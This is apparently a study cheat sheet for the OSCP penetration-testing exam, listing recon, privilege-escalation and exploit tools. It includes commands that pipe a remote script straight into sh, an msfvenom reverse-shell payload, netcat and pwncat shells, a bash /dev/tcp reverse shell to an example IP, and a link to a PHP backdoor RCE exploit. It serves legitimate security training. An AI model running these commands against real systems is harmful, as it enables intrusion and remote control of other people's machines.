# Offensive Security Certified Professional
## OSCP Tools and Resources for Your Journey


##### Nmap Automator. Save time on port/vuln scans:
https://github.com/21y4d/nmapAutomator

##### PWNCAT - Unbreakable Persistent Reverse Shell (Also IDS/Firewall Evasion :)
https://github.com/cytopia/pwncat

##### Linpeas
https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

    curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
    
 ###### Local network
    sudo python -m SimpleHTTPServer 80 #Host
    curl 10.10.10.10/linpeas.sh | sh #Victim

##### Linux Privilege Checker
https://github.com/sleventyeleven/linuxprivchecker

Category | Command Examples
------------ | -------------
MSFVENOM | msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.221 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o ms17-010.exe
SMB | python3 smbserver.py lab "~/OSCP/EXPLOITS/MS17-010/CLISHARE"
NETCAT | nc -nvlp 443   *(Creates a local listener)*
CRACKING | hashcat -m 1000 -a 0 --force --show --username hash.txt wordlist1.lst 
SHELL | Resolve "TERM environment variable not set":  *$ *export TERM=xterm**
SHELL | Fully interactive shell (Python): *$ python3 -c 'import pty; pty.spawn("/bin/bash")'*
SHELL | PWNCAT Ex. *$ pwncat -e '/bin/bash' example.com 4444*
SHELL | Reverse Bash Shell *$ bash -i >& /dev/tcp/10.10.10.10/4443 0>&1*


## Exploits
PHP 8.1.0-dev Backdoor RCE
https://github.com/flast101/php-8.1.0-dev-backdoor-rce
